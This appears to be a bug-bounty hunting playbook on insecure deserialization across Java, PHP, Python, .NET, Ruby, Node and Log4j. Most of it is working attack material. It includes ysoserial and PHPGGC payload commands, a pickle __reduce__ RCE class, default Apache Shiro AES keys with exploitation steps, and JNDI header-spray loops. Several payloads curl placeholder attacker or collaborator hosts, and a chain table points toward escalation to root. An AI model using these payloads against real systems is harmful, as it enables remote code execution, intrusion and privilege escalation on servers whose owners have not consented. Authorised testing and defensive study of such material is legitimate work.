- Sayar et al., "In-depth Study of Java Deserialization" -- ACM TOSEM 32(1), 2023

Threat Intelligence:
- Mandiant, "Now You Serial, Now You Don't" -- Dec 2021
- NCC Group RIFT -- Log4Shell detection -- Dec 2021
- JFrog security blog -- Hugging Face malicious models -- Feb 2024
- Protect AI -- 4M+ models scanned, 352,000 unsafe issues (2026)

Vendor Security:
- Jackson Security Wiki: github.com/FasterXML/jackson-databind/wiki
- XStream Security: x-stream.github.io/security.html
- Microsoft BinaryFormatter Migration Guide
- Apache Shiro Security Advisories
- Apache Dubbo Security Advisories


---

## From hack-skills: Insecure Deserialization — Advanced Techniques

### Traffic Fingerprinting

| Serialization | Magic Bytes | Base64 Prefix | Location |
|---|---|---|---|
| Java | `AC ED 00 05` | `rO0AB` | POST body, cookies (rememberMe), hidden fields |
| PHP | `O:N:"Class"` | — | POST body, session cookies |
| Python pickle | `80 03` or `80 04` | — | API params, Redis values |
| .NET | `AAEAAD` (base64) | — | ViewState, cookies |
| Ruby Marshal | binary, no text header | — | Session data |

### Java — ysoserial Key Chains

```bash
# URLDNS — DNS-only confirmation (safe, no RCE, works everywhere):
java -jar ysoserial.jar URLDNS "http://TOKEN.burpcollaborator.net" > probe.bin

# CommonsCollections RCE (most common vulnerable dep):
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned" > cc1.bin
java -jar ysoserial.jar CommonsCollections6 "id" | base64 -w0  # for Shiro

# Spring, Groovy, Hibernate, JDK-only:
java -jar ysoserial.jar Spring1 "id" > spring1.bin
java -jar ysoserial.jar Groovy1 "id" > groovy1.bin
java -jar ysoserial.jar Jdk7u21 "id" > jdk7.bin  # JDK 7u21, no extra dep
```

### Apache Shiro rememberMe (CVE-2016-4437 / SHIRO-550)

Shiro AES-CBC encrypts serialized Java objects in rememberMe cookie.

```
Common hard-coded keys:
kPH+bIxk5D2deZiIxcaaaA==   (most common default)
wGJlpLanyXlVB1LUUWolBg==
4AvVhmFLUs0KTA3Kprsdag==

Attack:
1. Generate ysoserial payload (CommonsCollections6 for broad compat)
2. AES-CBC encrypt with key + random IV
3. base64-encode → set as rememberMe cookie
4. Server decrypts → deserializes → RCE

DNSLog confirm: java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn" → encrypt → check log
```

### PHP — Magic Methods Chain

PHP deserialization triggers magic methods: `__wakeup()` → `__destruct()` → `__toString()` → `__call()`

```bash
# PHPGGC — PHP gadget chain generator:
phpggc -l                              # list available chains
phpggc Laravel/RCE1 system "id"        # Laravel RCE
phpggc Symfony/RCE1 system "id"        # Symfony
phpggc Monolog/RCE1 system "id"        # Monolog

# Phar deserialization (triggers on ANY phar:// file operation):
phpggc -p phar -o exploit.phar Monolog/RCE1 system "id"
# Then trigger: file_exists("phar://uploads/avatar.jpg") → RCE
```

### Python — Pickle RCE

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
# Send to target calling pickle.loads(user_data)
```

### Ruby Deserialization

```yaml
# YAML.load (not safe_load) on Ruby pre-2.7.2 — Gem::Requirement chain:
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  ...

# Always test: YAML.load("--- !ruby/object:Gem::Installer\ni: x")
# Class instantiation = YAML.load is unsafe
```

### Detection Decision Tree

```
Binary blob or encoded object in request?
├── Java prefix (AC ED / rO0AB)?
│   ├── Use URLDNS probe first (safe)
│   ├── Identify libraries via error messages/banner
│   └── Try matching ysoserial chains
├── PHP format (O:N:"...) ?
│   ├── Identify framework (Laravel/Symfony/WP)
│   ├── Try PHPGGC chains
│   └── Check phar:// in file operations
└── Python binary blob?
    ├── Try pickle payload with DNS callback
    └── Check for PyYAML yaml.load (unsafe)
```


---

## hunt-deserialization — Hunting Methodology (real BB reports)

# HUNT-DESERIALIZATION — Insecure Deserialization

## Crown Jewel Targets

Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.

**Highest-value chains:**
- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE

---

## Attack Surface Signals

### Detection Patterns
```bash
# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# PHP serialization: O:8:"stdClass":0:{}
# Python pickle: starts with \x80\x04 (protocol 4) or \x80\x02

# Apache Shiro: rememberMe cookie present
curl -sI https://$TARGET/ | grep -i "Set-Cookie.*rememberMe"

# Log4j: test user-controlled fields for JNDI interpolation
curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/
```

### Header / Cookie Signals
```
Content-Type: application/x-java-serialized-object
Cookie containing rO0= prefix (Java base64 serialized)
Cookie: rememberMe= (Apache Shiro)
Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)
Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Java Deserialization (ysoserial)
```bash
# Install ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate OOB detection payload
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl http://COLLAB_HOST/ysoserial' | base64 -w0

# Send as body or cookie
java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \
  curl -s https://$TARGET/wls-wsat/CoordinatorPortType \
    -H "Content-Type: application/x-java-serialized-object" \
    --data-binary @-

# Apache Shiro exploit (default AES key)
python3 shiro_exploit.py -u https://$TARGET/ -c "id"
```

### Phase 2 — PHP Object Injection
```bash
# Find unserialize() calls in source
grep -r "unserialize(" --include="*.php" .

# Inject test: O:8:"stdClass":1:{s:4:"test";s:5:"value";}
# Send in cookie, POST param, or hidden form field
# If error changes → deserialization confirmed

# Craft gadget chain using phpggc
git clone https://github.com/ambionics/phpggc
php phpggc -l  # list chains
php phpggc Laravel/RCE5 system id | base64
```

### Phase 3 — Python Pickle
```bash
# Generate OOB payload
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# Send as cookie or POST body
curl -s https://$TARGET/api/load-model \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pkl
```

### Phase 3b — PHP phar://, Python YAML, Node deserialization
- **PHP phar:// (no `unserialize()` call)** — any filesystem function (`file_exists`/`fopen`/`getimagesize`) on a `phar://` path deserializes the archive metadata -> object injection with zero `unserialize()` in code.
  ```bash
  phpggc -p phar -o poly.jpg Monolog/RCE1 system id   # valid-image + phar polyglot
  # then reach  phar://uploads/poly.jpg/x  via any fs call
  ```
- **Python `yaml.load()` (CVE-2017-18342)** — pre-5.1 default-unsafe:
  `!!python/object/apply:os.system ['curl http://$COLLAB/yaml']`
- **Node `node-serialize` (CVE-2017-5941)** — IIFE marker in any field passed to `unserialize()`:
  `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/node')}()"}`

### Phase 4 — .NET ViewState
```bash
# Check if ViewState is unsigned (MAC disabled)
# Look for __VIEWSTATE in HTML source without __VIEWSTATEMAC

# YSoSerial.Net
dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \
  -c "cmd /c curl http://COLLAB_HOST/viewstate-rce" -o base64
```

### Phase 5 — Log4Shell / JNDI
```bash
# Test all user-controlled inputs
COLLAB="COLLAB_HOST"
for HEADER in "User-Agent" "X-Forwarded-For" "Referer" "X-Api-Version" "Accept-Language"; do
  curl -s https://$TARGET/ -H "$HEADER: \${jndi:dns://$COLLAB/$HEADER}" &
done

# Test POST body fields
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"\${jndi:ldap://$COLLAB/a}\"}"
```

### Phase 6 — Ruby Marshal
```bash
# Look for Marshal.load in source
grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .

# Gem::Requirement gadget chain via marshalable objects
# Use ruby-advisory-db gadgets
```

---

## Chain Table

| Deserialization signal | Chain to | Impact |
|-----------------------|----------|--------|
| Any deser RCE | /etc/passwd + id output | Prove arbitrary command execution |
| RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
| Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
| Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |

---

## Automation
```bash
# OOB listener
interactsh-client -v -n 5

# JNDI exploit kit
git clone https://github.com/pimps/JNDI-Exploit-Kit
```

---

## Validation

✅ DNS/HTTP callback from COLLAB host: blind deserialization confirmed
✅ Command output in response: full RCE confirmed

**Severity:** Almost always **Critical** — RCE with server process privileges.

